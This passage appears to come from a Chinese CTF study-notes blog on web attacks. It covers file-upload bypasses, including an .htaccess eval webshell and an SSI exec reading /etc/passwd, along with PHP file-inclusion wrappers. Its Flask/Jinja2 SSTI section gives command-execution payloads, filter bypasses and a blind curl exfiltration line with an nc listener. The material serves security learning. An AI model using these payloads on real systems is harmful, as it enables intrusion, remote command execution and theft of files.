<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">php_value auto_prepend_file  &quot;.htaccess&quot;</span><br></pre></td></tr></table></figure>

<p> 将php代码写入.htaccess。代码前注释。访问index.php。就会自动包含.htaccess中的恶意代码 </p>
<p>如果过滤可以用\绕过</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">php_value auto_prepend_fi\</span><br><span class="line">le &quot;.htaccess&quot;</span><br><span class="line">#&lt;?php @eval($_GET[&apos;cmd&apos;]); ?&gt;\</span><br></pre></td></tr></table></figure>

<p> .htaccess中的#号将我们的恶意代码和污染的字符串都注释了。从而可以正常运行 </p>
<p>例如</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">filename=.htaccess&amp;content=php_value%20auto_prepend_fi\%0Ale%20%22.htaccess%22%0A%23%3C%3fphp%20%40eval(%24_GET[%27cmd%27])%3b%20%3f%3E\</span><br></pre></td></tr></table></figure>

<h3 id="开启了cgi扩展，可以来解析shell脚本"><a href="#开启了cgi扩展，可以来解析shell脚本" class="headerlink" title="开启了cgi扩展，可以来解析shell脚本"></a>开启了cgi扩展，可以来解析shell脚本</h3><p>.htaccess</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Options +ExecCGI</span><br><span class="line">AddHandler cgi-script .sh</span><br></pre></td></tr></table></figure>

<p>solve.sh</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line">echo &quot;Content-Type: text/plain&quot;</span><br><span class="line">echo &quot;&quot;</span><br><span class="line">ls -lah /</span><br><span class="line">exit 0</span><br></pre></td></tr></table></figure>

<h3 id="绕过过滤"><a href="#绕过过滤" class="headerlink" title="绕过过滤"></a>绕过过滤</h3><p>不能写 &lt;? 时使用伪协议</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">AddType application/x-httpd-php .wuwu</span><br><span class="line">php_value auto_append_file &quot;php://filter/convert.base64-decode/resource=shell.wuwu&quot;</span><br></pre></td></tr></table></figure>

<p>支持换行</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">AddType  application/x-httpd-p\</span><br><span class="line">hp    .jpg</span><br></pre></td></tr></table></figure>

<h2 id="使用00截断（需要magic-quotes-gpc-Off）"><a href="#使用00截断（需要magic-quotes-gpc-Off）" class="headerlink" title="使用00截断（需要magic_quotes_gpc=Off）"></a>使用00截断（需要magic_quotes_gpc=Off）</h2><p>基于一个组合逻辑漏洞</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">name = getname(http request)//假如这时候获取到的文件名是test.asp.jpg(asp后面为0x00)</span><br><span class="line">type = gettype(name)//而在gettype()函数里处理方式是从后往前扫描扩展名，所以判断为jpg</span><br><span class="line">if(type==jpg)</span><br><span class="line">SaveFileToPath(UploadPath.name,name)</span><br></pre></td></tr></table></figure>

<p>在第一个后缀名后加一个空格(0x20)，使用bp-&gt;repeater-&gt;hex，将其改成0x00</p>
<h2 id="shtml"><a href="#shtml" class="headerlink" title="shtml"></a>shtml</h2><p>当Web服务器为Apache和IIS（支持SSI功能的服务器）且开启了SSI与CGI支持</p>
<p>当目标服务器开启了SSI与CGI支持,我们就可以上传shtml,利用<!--#exec cmd=”id” -->语法执行命令。</p>
<p>使用SSI(Server Side Include)的html文件扩展名，SSI（Server Side Include)，通常称为”服务器端嵌入”或者叫”服务器端包含”，是一种类似于ASP的基于服务器的网页制作技术。默认扩展名是 .stm、.shtm 和 .shtml。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!--#exec cmd=&quot;cat /etc/passwd&quot;--&gt;</span><br></pre></td></tr></table></figure>

<h2 id="竞争上传"><a href="#竞争上传" class="headerlink" title="竞争上传"></a>竞争上传</h2><ul>
<li>情景<br>文件上传后，检测是否合法，不合法就删除</li>
<li>利用方式<br>在删除前访问到上传的文件</li>
</ul>
<p><a href="https://github.com/backlion/demo/blob/master/lfi_phpinfo.py" target="_blank" rel="noopener">例子</a> </p>
<h2 id="过滤-lt-或php"><a href="#过滤-lt-或php" class="headerlink" title="过滤&lt;?或php"></a>过滤&lt;?或php</h2><ul>
<li>js标签绕过，需要php小于7.0</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;script language=&quot;PHP&quot;&gt;</span><br><span class="line">$fh=fopen(&quot;../flag.&quot;.strtolower(&quot;PHP&quot;),&apos;r&apos;);</span><br><span class="line">echo fread($fh,filesize(&quot;../flag.&quot;.strtolower(&quot;PHP&quot;)));</span><br><span class="line">fclose($fh);</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li>PHP开启短标签即<code>short_open_tag=on</code>时，可以使用``输出变量，在PHP 5.4 之后默认支持</li>
</ul>
<blockquote>
<p>gif<code>的文件头</code>GIF89a </p>
<p>nginx的服务器，而且上传目录下有一个php文件，所以上窜.user.ini<br>apache的服务器，应该上传.htaccess</p>
<p>两个要注意的点是:<br>.htaccess上传的时候不能用GIF89a等文件头去绕过exif_imagetype,因为这样虽然能上传成功，但.htaccess文件无法生效。这时个办法:</p>
<p>采用xbm格式X Bit Map，绕过exif_imagetype()方法的检测，上传文件来解析。</p>
<p>在计算机图形学中，X Window系统使用X BitMap，一种纯文本二进制图像格式，用于存储X GUI中使用的光标和图标位图。<br>XBM数据由一系列包含单色像素数据的静态无符号字符数组组成，当格式被普遍使用时，XBM通常出现在标题.h文件中，每个图像在标题中存储一个数组。</p>
<p>也就是用c代码来标识一个xbm文件，前两个#defines指定位图的高度和宽度【以像素为单位，比如以下xbm文件：</p>
<p>#define test_width 16<br>#define test_height 7</p>
</blockquote>
]]></content>
      <categories>
        <category>笔记</category>
      </categories>
  </entry>
  <entry>
    <title>文件包含</title>
    <url>/2020/03/17/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/</url>
    <content><![CDATA[<h2 id="常见文件包含函数"><a href="#常见文件包含函数" class="headerlink" title="常见文件包含函数"></a>常见文件包含函数</h2><h2 id="php中常见的文件包含函数有以下四种："><a href="#php中常见的文件包含函数有以下四种：" class="headerlink" title="php中常见的文件包含函数有以下四种："></a>php中常见的文件包含函数有以下四种：</h2><blockquote>
<p>include()<br>require()<br>include_once()<br>require()_once()</p>
</blockquote><p>include与require基本是相同的，除了错误处理方面:</p><a id="more"></a>

<p>include()，只生成警告（E_WARNING），并且脚本会继续<br>require()，会生成致命错误（E_COMPILE_ERROR）并停止脚本<br>include_once()与require()_once()，如果文件已包含，则不会包含，其他特性如上</p>
<h2 id="php伪协议"><a href="#php伪协议" class="headerlink" title="php伪协议"></a>php伪协议</h2><h3 id="php-input"><a href="#php-input" class="headerlink" title="php://input"></a>php://input</h3><p>前提 phpinfo中的allow_url_include是开启的</p>
<blockquote>
<p><strong>php://input</strong> 可以访问请求的原始数据的只读流, 将post请求中的数据作为PHP代码执行。 </p>
</blockquote>
<h3 id="php-filter"><a href="#php-filter" class="headerlink" title="php://filter"></a>php://filter</h3><p> <code>file_get_contents</code> 是可以触发 <code>php://filter</code> </p>
<p>php://filter在双off的情况下也可以正常使用；</p>
<p>allow_url_fopen ：off/on</p>
<p>allow_url_include：off/on</p>
<blockquote>
<p>php://filter 读取源代码并进行base64编码输出，不然会直接当做php代码执行就看不到源代码内容了。 </p>
<p>?path=php://filter/read=convert.base64-encode/resource=xxxxx.php</p>
</blockquote>
<h3 id="data-伪协议"><a href="#data-伪协议" class="headerlink" title="data://伪协议"></a>data://伪协议</h3><blockquote>
<p>数据流封装器，和php://相似都是利用了流的概念，将原本的include的文件流重定向到了用户可控制的输入流中，简单来说就是执行文件的包含方法包含了你的输入流，通过你输入payload来实现目的</p>
</blockquote>
<p>如果php.ini里的allow_url_include=On（PHP &lt; 5.3.0）,就可以造成任意代码执行，同理在这就可以理解成远程文件包含漏洞（RFI） </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">data:text/plain,&lt;?php phpinfo();?&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">data:text/plain; base64,</span><br></pre></td></tr></table></figure>

<h2 id="本地文件包含"><a href="#本地文件包含" class="headerlink" title="本地文件包含"></a>本地文件包含</h2><p> 包含的实现<br>包含的时候，不一定要包含.php文件，只要包含一块完整的php代码，例如a.jpg，内容为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php phpinfo();?&gt;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>笔记</category>
      </categories>
  </entry>
  <entry>
    <title>模块注入</title>
    <url>/2020/03/17/%E6%A8%A1%E5%9D%97%E6%B3%A8%E5%85%A5/</url>
    <content><![CDATA[<h3 id="基本判断"><a href="#基本判断" class="headerlink" title="基本判断"></a>基本判断</h3><p><img src="/2020/03/17/%E6%A8%A1%E5%9D%97%E6%B3%A8%E5%85%A5/%E5%88%A4%E6%96%AD.png" alt></p><h3 id="一些知识点"><a href="#一些知识点" class="headerlink" title="一些知识点"></a>一些知识点</h3><p>flask SSTI的基本思路就是利用python中的魔术方法找到自己要用的函数</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">__dict__ 保存类实例或对象实例的属性变量键值对字典</span><br><span class="line">__class__  返回类型所属的对象</span><br><span class="line">__mro__    返回一个包含对象所继承的基类元组，方法在解析时按照元组的顺序解析。</span><br><span class="line">__bases__   返回该对象所继承的基类</span><br><span class="line">// __base__和__mro__都是用来寻找基类的</span><br><span class="line"></span><br><span class="line">__subclasses__   每个新类都保留了子类的引用，这个方法返回一个类中仍然可用的的引用的列表</span><br><span class="line">__init__  类的初始化方法</span><br><span class="line">__globals__  对包含函数全局变量的字典的引用</span><br></pre></td></tr></table></figure><a id="more"></a>



<h4 id="config"><a href="#config" class="headerlink" title="config"></a>config</h4><p><code></code>可以获取当前设置，如果题目类似<code>app.config [&#39;FLAG&#39;] = os.environ.pop（&#39;FLAG&#39;）</code>，那可以直接访问<code></code>或者<code></code>得到flag </p>
<h4 id="self"><a href="#self" class="headerlink" title="self"></a>self</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&#123;self&#125;&#125; ⇒ &lt;TemplateReference None&gt; &#123;&#123;self.__dict__._TemplateReference__context.config&#125;&#125; ⇒ 同样可以找到config</span><br></pre></td></tr></table></figure>

<h4 id="“”-等"><a href="#“”-等" class="headerlink" title="“”,[],()等"></a>“”,[],()等</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">主要目的是配合__class__.__mro__[2]这样找到object类</span><br><span class="line">&#123;&#123;[].__class__.__base__.__subclasses__()[68].__init__.__globals__[&apos;os&apos;].__dict__.environ[&apos;FLAG&apos;]&#125;&#125;</span><br></pre></td></tr></table></figure>

<h4 id="url-for-g-request-namespace-lipsum-range-session-dict-get-flashed-messages-cycler-joiner-config等"><a href="#url-for-g-request-namespace-lipsum-range-session-dict-get-flashed-messages-cycler-joiner-config等" class="headerlink" title="url_for, g, request, namespace, lipsum, range, session, dict, get_flashed_messages, cycler, joiner, config等"></a>url_for, g, request, namespace, lipsum, range, session, dict, get_flashed_messages, cycler, joiner, config等</h4><p>如果config，self不能使用，要获取配置信息，就必须从它的上部全局变量（访问配置current_app等）。</p>
<p>例如：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&#123;url_for.__globals__[&apos;current_app&apos;].config.FLAG&#125;&#125;</span><br><span class="line">&#123;&#123;get_flashed_messages.__globals__[&apos;current_app&apos;].config.FLAG&#125;&#125;</span><br><span class="line">&#123;&#123;request.application.__self__._get_data_for_json.__globals__[&apos;json&apos;].JSONEncoder.default.__globals__[&apos;current_app&apos;].config[&apos;FLAG&apos;]&#125;&#125;</span><br></pre></td></tr></table></figure>

<h3 id="模板注入介绍"><a href="#模板注入介绍" class="headerlink" title="模板注入介绍"></a>模板注入介绍</h3><p><a href="https://xz.aliyun.com/t/3679#toc-10" target="_blank" rel="noopener">flask之ssti模版注入从零到入门</a><br><a href="https://p0sec.net/index.php/archives/120/" target="_blank" rel="noopener">Flask/Jinja2模板注入中的一些绕过姿势</a><br><a href="https://zhuanlan.zhihu.com/p/28823933" target="_blank" rel="noopener">服务端模板注入攻击</a><br><a href="https://www.cnblogs.com/20175211lyz/p/11425368.html" target="_blank" rel="noopener">CTF SSTI(服务器模板注入)</a></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// SQL 注入</span></span><br><span class="line">$query = <span class="string">"select * from sometable where id="</span>.$_GET[<span class="string">'id'</span>];</span><br><span class="line">mysql_query($query);</span><br><span class="line">------------- 华丽的分割线 -------------</span><br><span class="line"><span class="comment">// 模版注入</span></span><br><span class="line">$temp-&gt;render(<span class="string">"Hello "</span>.$_GET[<span class="string">'username'</span>]);</span><br></pre></td></tr></table></figure>

<blockquote>
<p>而服务端模板注入和常见Web注入的成因一样，也是服务端接收了用户的输入，将其作为 Web 应用模板内容的一部分，在进行目标编译渲染的过程中，执行了用户插入的恶意内容，因而可能导致了敏感信息泄露、代码执行、GetShell 等问题。其影响范围主要取决于模版引擎的复杂性。 </p>
<p> ssti服务端模板注入，ssti主要为python的一些框架 jinja2 mako tornado django，PHP框架smarty twig，java框架jade velocity等等使用了渲染函数时，由于代码不规范或信任了用户输入而导致了服务端模板注入，模板渲染其实并没有漏洞，主要是程序员对代码不规范不严谨造成了模板注入漏洞，造成模板可控。本文着重对flask模板注入进行浅析。 </p>
</blockquote>
<h3 id="模块引擎"><a href="#模块引擎" class="headerlink" title="模块引擎"></a>模块引擎</h3><p>首先我们先讲解下什么是模板引擎，为什么需要模板，模板引擎可以让（网站）程序实现界面与数据分离，业务代码与逻辑代码的分离，这大大提升了开发效率，良好的设计也使得代码重用变得更加容易。但是往往新的开发都会导致一些安全问题，虽然模板引擎会提供沙箱机制，但同样存在沙箱逃逸技术来绕过。</p>
<p>模板只是一种提供给程序来解析的一种语法，换句话说，模板是用于从数据（变量）到实际的视觉表现（HTML代码）这项工作的一种实现手段，而这种手段不论在前端还是后端都有应用。</p>
<p>通俗点理解：拿到数据，塞到模板里，然后让渲染引擎将赛进去的东西生成 html 的文本，返回给浏览器，这样做的好处展示数据快，大大提升效率。</p>
<p>后端渲染：浏览器会直接接收到经过服务器计算之后的呈现给用户的最终的HTML字符串，计算就是服务器后端经过解析服务器端的模板来完成的，后端渲染的好处是对前端浏览器的压力较小，主要任务在服务器端就已经完成。</p>
<p>前端渲染：前端渲染相反，是浏览器从服务器得到信息，可能是json等数据包封装的数据，也可能是html代码，他都是由浏览器前端来解析渲染成html的人们可视化的代码而呈现在用户面前，好处是对于服务器后端压力较小，主要渲染在用户的客户端完成。</p>
<p>让我们用例子来简析模板渲染。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;div&gt;&#123;$what&#125;&lt;/div&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>我们想要呈现在每个用户面前自己的名字。但是{$what}我们不知道用户名字是什么，用一些url或者cookie包含的信息，渲染到what变量里，呈现给用户的为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;div&gt;张三&lt;/div&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>当然这只是最简单的示例，一般来说，至少会提供分支，迭代。还有一些内置函数。</p>
<h3 id="模板注入检测"><a href="#模板注入检测" class="headerlink" title="模板注入检测"></a>模板注入检测</h3><p> Twig 模板引擎里，  除了可以输出传递的变量以外，还能执行一些基本的表达式然后将其结果作为该模板变量的值，例如这里用户输入 name=20 ，则在服务端拼接的模版内容为：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">Hello &#123;&#123;<span class="number">2</span>*<span class="number">10</span>&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>Twig 模板引擎在编译模板的过程中会计算 20  中的表达式 2*10 ，会将其返回值 20  作为模板变量的值输出</p>
<h3 id="利用ssti攻击"><a href="#利用ssti攻击" class="headerlink" title="利用ssti攻击"></a>利用ssti攻击</h3><p>在python中，object类是Python中所有类的基类，如果定义一个类时没有指定继承哪个类，则默认继承object类。我们从这段话出发，假定你已经知道ssti漏洞了，但是完全没学过ssti代码怎么写，接下来你可能会学到一点废话。</p>
<p>我们在pycharm中运行代码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">print(&quot;&quot;.__class__)</span><br></pre></td></tr></table></figure>

<p>返回了&lt;class ‘str’&gt;，对于一个空字符串他已经打印了str类型，在python中，每个类都有一个<strong>bases</strong>属性，列出其基类。现在我们写代码。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">print(&quot;&quot;.__class__.__bases__)</span><br></pre></td></tr></table></figure>

<p>打印返回(&lt;class ‘object’&gt;,)，我们已经找到了他的基类object，而我们想要寻找object类的不仅仅只有bases，同样可以使用<strong>mro</strong>，<strong>mro</strong>给出了method resolution order，即解析方法调用的顺序。我们实例打印一下mro。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">print(&quot;&quot;.__class__.__mro__)</span><br></pre></td></tr></table></figure>

<p>可以看到返回了(&lt;class ‘str’&gt;, &lt;class ‘object’&gt;)，同样可以找到object类，正是由于这些但不仅限于这些方法，我们才有了各种沙箱逃逸的姿势。正如上面的解释，<strong>mro</strong>返回了解析方法调用的顺序，将会打印两个。在flask ssti中poc中很大一部分是从object类中寻找我们可利用的类的方法。我们这里只举例最简单的。接下来我们增加代码。接下来我们使用subclasses,<strong>subclasses</strong>() 这个方法，这个方法返回的是这个类的子类的集合，也就是object类的子类的集合。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">print(&quot;&quot;.__class__.__bases__[0].__subclasses__())</span><br></pre></td></tr></table></figure>

<p>python 3.6 版本下的object类下的方法集合。这里要记住一点2.7和3.6版本返回的子类不是一样的，但是2.7有的3.6大部分都有。需要自己寻找合适的标号来调用接下来我将进一步解释。接下来就是我们需要找到合适的类，然后从合适的类中寻找我们需要的方法。这里开始我们不再用pycharm打印了，直接利用上面我们已经搭建好的漏洞环境来进行测试。通过我们在如上这么多类中一个一个查找，找到我们可利用的类，这里举例一种。&lt;class ‘os._wrap_close’&gt;，os命令相信你看到就感觉很亲切。我们正是要从这个类中寻找我们可利用的方法，通过大概猜测找到是第118个类，0也对应一个类，所以这里写[118]。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:5000/test?&#123;&#123;&quot;&quot;.__class__.__bases__[0].__subclasses__()[117]&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>这个时候我们便可以利用.<strong>init</strong>.<strong>globals</strong>来找os类下的，init初始化类，然后globals全局来查找所有的方法及变量及参数。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:5000/test?&#123;&#123;&quot;&quot;.__class__.__bases__[0].__subclasses__()[117].__init__.__globals__&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>此时我们可以在网页上看到各种各样的参数方法函数。我们找其中一个可利用的function popen，在python2中可找file读取文件，很多可利用方法，详情可百度了解下。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:5000/test?&#123;&#123;&quot;&quot;.__class__.__bases__[0].__subclasses__()[117].__init__.__globals__[&apos;popen&apos;](&apos;dir&apos;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>

<p> 此时便可以看到命令已经执行。如果是在linux系统下便可以执行其他命令。此时我们已经成功得到权限。进下来我们将进一步简单讨论如何进行沙箱逃逸。 </p>
<h3 id="ssti步骤"><a href="#ssti步骤" class="headerlink" title="ssti步骤"></a>ssti步骤</h3><h4 id="获取基本类"><a href="#获取基本类" class="headerlink" title="获取基本类"></a>获取基本类</h4><p>首先通过str、dict、tuple或list获取python的基本类(当然也可以利用一些其他在jinja2中存在的对象，比如request)：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&apos;&apos;.__class__.__mro__[2]</span><br><span class="line">&#123;&#125;.__class__.__bases__[0]</span><br><span class="line">().__class__.__bases__[0]</span><br><span class="line">[].__class__.__bases__[0]</span><br><span class="line">request.__class__.__mro__[8]</span><br></pre></td></tr></table></figure>

<p>可以借助getitem绕过中括号限制：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&apos;&apos;.__class__.__mro__.__getitem__(2)</span><br><span class="line">&#123;&#125;.__class__.__bases__.__getitem__(0)</span><br><span class="line">().__class__.__bases__.__getitem__(0)</span><br><span class="line">request.__class__.__mro__.__getitem__(8)</span><br></pre></td></tr></table></figure>

<h4 id="文件操作"><a href="#文件操作" class="headerlink" title="文件操作"></a>文件操作</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">object.__subclasses__()[40]  为file类，所以可以对文件进行操作</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">读文件：</span><br><span class="line"></span><br><span class="line">object.__subclasses__()[40](&apos;/etc/passwd&apos;).read()</span><br><span class="line"></span><br><span class="line">写文件：</span><br><span class="line"></span><br><span class="line">object.__subclasses__()[40](&apos;/tmp&apos;).write(&apos;test&apos;)</span><br></pre></td></tr></table></figure>

<h4 id="执行命令"><a href="#执行命令" class="headerlink" title="执行命令"></a>执行命令</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">object.__subclasses__()[59].__init__.func_globals.linecache下直接有os类，可以直接执行命令：</span><br><span class="line"></span><br><span class="line">object.__subclasses__()[59].__init__.func_globals.linecache.os.popen(&apos;id&apos;).read()</span><br><span class="line"></span><br><span class="line">object.__subclasses__()[59].__init__.__globals__.__builtins__下有eval，__import__等的全局函数，可以利用此来执行命令：</span><br><span class="line"></span><br><span class="line">object.__subclasses__()[59].__init__.__globals__[&apos;__builtins__&apos;][&apos;eval&apos;](&quot;__import__(&apos;os&apos;).popen(&apos;id&apos;).read()&quot;)</span><br><span class="line">object.__subclasses__()[59].__init__.__globals__.__builtins__.eval(&quot;__import__(&apos;os&apos;).popen(&apos;id&apos;).read()&quot;)</span><br><span class="line">object.__subclasses__()[59].__init__.__globals__.__builtins__.__import__(&apos;os&apos;).popen(&apos;id&apos;).read()</span><br><span class="line">object.__subclasses__()[59].__init__.__globals__[&apos;__builtins__&apos;][&apos;__import__&apos;](&apos;os&apos;).popen(&apos;id&apos;).read()</span><br></pre></td></tr></table></figure>

<h2 id="Jinjia2模板引擎通用的RCE-Payload："><a href="#Jinjia2模板引擎通用的RCE-Payload：" class="headerlink" title="Jinjia2模板引擎通用的RCE Payload："></a>Jinjia2模板引擎通用的RCE Payload：</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==&apos;catch_warnings&apos; %&#125;&#123;&#123; c.__init__.__globals__[&apos;__builtins__&apos;].eval(&quot;__import__(&apos;os&apos;).popen(&apos;&lt;command&gt;&apos;).read()&quot;) &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>

<p> 在<command>添加命令即可 </p>
<h2 id="ctf中的一些绕过tips"><a href="#ctf中的一些绕过tips" class="headerlink" title="ctf中的一些绕过tips"></a>ctf中的一些绕过tips</h2><p>没什么系统思路。就是不断挖掘类研究官方文档以及各种能够利用的姿势。这里从最简单的绕过说起。</p>
<h3 id="过滤-等括号"><a href="#过滤-等括号" class="headerlink" title="过滤[]等括号"></a>过滤[]等括号</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">使用getitem绕过。如原poc &#123;&#123;&quot;&quot;.__class__.__bases__[0]&#125;&#125;</span><br><span class="line"></span><br><span class="line">绕过后&#123;&#123;&quot;&quot;.__class__.__bases__.__getitem__(0)&#125;&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">读文件：</span><br><span class="line">&apos;&apos;.__class__.__mro__.__getitem__(2).__subclasses__().pop(40)(&apos;/etc/passwd&apos;).read()</span><br><span class="line">执行命令：</span><br><span class="line">&apos;&apos;.__class__.__mro__.__getitem__(2).__subclasses__().pop(59).__init__.func_globals.linecache.os.popen(&apos;ls&apos;).read()</span><br></pre></td></tr></table></figure>

<h3 id="过滤class"><a href="#过滤class" class="headerlink" title="过滤class"></a>过滤class</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">使用session</span><br><span class="line"></span><br><span class="line">poc &#123;&#123;session[&apos;__cla&apos;+&apos;ss__&apos;].__bases__[0].__bases__[0].__bases__[0].__bases__[0].__subclasses__()[118]&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>多个bases[0]是因为一直在向上找object类。使用mro就会很方便</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&#123;session[&apos;__cla&apos;+&apos;ss__&apos;].__mro__[12]&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>或者</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">request[&apos;__cl&apos;+&apos;ass__&apos;].__mro__[12]&#125;&#125;</span><br></pre></td></tr></table></figure>

<h3 id="timeit姿势"><a href="#timeit姿势" class="headerlink" title="timeit姿势"></a>timeit姿势</h3><p>可以学习一下 2017 swpu-ctf的一道沙盒python题，</p>
<p>这里不详说了，博大精深，我只意会一二。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import timeit</span><br><span class="line">timeit.timeit(&quot;__import__(&apos;os&apos;).system(&apos;dir&apos;)&quot;,number=1)</span><br><span class="line"></span><br><span class="line">import platform</span><br><span class="line">print platform.popen(&apos;dir&apos;).read()</span><br></pre></td></tr></table></figure>

<h3 id="过滤引号"><a href="#过滤引号" class="headerlink" title="过滤引号"></a>过滤引号</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">先获取chr函数，赋值给chr，后面拼接字符串就好了：</span><br><span class="line">&#123;% set chr=().__class__.__bases__.__getitem__(0).__subclasses__()[59].__init__.__globals__.__builtins__.chr %&#125;&#123;&#123; ().__class__.__bases__.__getitem__(0).__subclasses__().pop(40)(chr(47)%2bchr(101)%2bchr(116)%2bchr(99)%2bchr(47)%2bchr(112)%2bchr(97)%2bchr(115)%2bchr(115)%2bchr(119)%2bchr(100)).read() &#125;&#125;</span><br><span class="line">借助request对象(推荐)：</span><br><span class="line">&#123;&#123; ().__class__.__bases__.__getitem__(0).__subclasses__().pop(40)(request.args.path).read() &#125;&#125;&amp;path=/etc/passwd</span><br><span class="line">执行命令：</span><br><span class="line">&#123;% set chr=().__class__.__bases__.__getitem__(0).__subclasses__()[59].__init__.__globals__.__builtins__.chr %&#125;&#123;&#123; ().__class__.__bases__.__getitem__(0).__subclasses__().pop(59).__init__.func_globals.linecache.os.popen(chr(105)%2bchr(100)).read() &#125;&#125;</span><br><span class="line">&#123;&#123; ().__class__.__bases__.__getitem__(0).__subclasses__().pop(59).__init__.func_globals.linecache.os.popen(request.args.cmd).read() &#125;&#125;&amp;cmd=id</span><br></pre></td></tr></table></figure>

<h3 id="过滤双下划线"><a href="#过滤双下划线" class="headerlink" title="过滤双下划线__"></a>过滤双下划线__</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&#123; &apos;&apos;[request.args.class][request.args.mro][2][request.args.subclasses]()[40](&apos;/etc/passwd&apos;).read() &#125;&#125;&amp;class=__class__&amp;mro=__mro__&amp;subclasses=__subclasses__</span><br></pre></td></tr></table></figure>

<blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">过滤&#123;&#123;</span><br><span class="line">可以利用&#123;%if%&#125; &#123;% endif %&#125;标记</span><br></pre></td></tr></table></figure>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;% if &apos;&apos;.__class__.__mro__[2].__subclasses__()[59].__init__.func_globals.linecache.os.popen(&apos;curl http://127.0.0.1:7999/?i=`whoami`&apos;).read()==&apos;p&apos; %&#125;1&#123;% endif %&#125;</span><br><span class="line">nc -nlvp 7999</span><br><span class="line">相当于盲命令执行，利用curl将执行结果带出来</span><br><span class="line">如果不能执行命令，读取文件可以利用盲注的方法逐位将内容爆出来</span><br><span class="line">&#123;% if &apos;&apos;.__class__.__mro__[2].__subclasses__()[40](&apos;/tmp/test&apos;).read()[0:1]==&apos;p&apos; %&#125;~p0~&#123;% endif %&#125;</span><br></pre></td></tr></table></figure>

<h3 id="过滤关键词"><a href="#过滤关键词" class="headerlink" title="过滤关键词"></a>过滤关键词</h3><p><strong>base64编码绕过</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">__getattribute__使用实例访问属性时,调用该方法</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">例如被过滤掉__class__关键词</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&#123;[].__getattribute__(&apos;X19jbGFzc19f&apos;.decode(&apos;base64&apos;)).__base__.__subclasses__()[40](&quot;/etc/passwd&quot;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>

<p><strong>字符串拼接绕过</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&#123;[].__getattribute__(&apos;__c&apos;+&apos;lass__&apos;).__base__.__subclasses__()[40](&quot;/etc/passwd&quot;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>

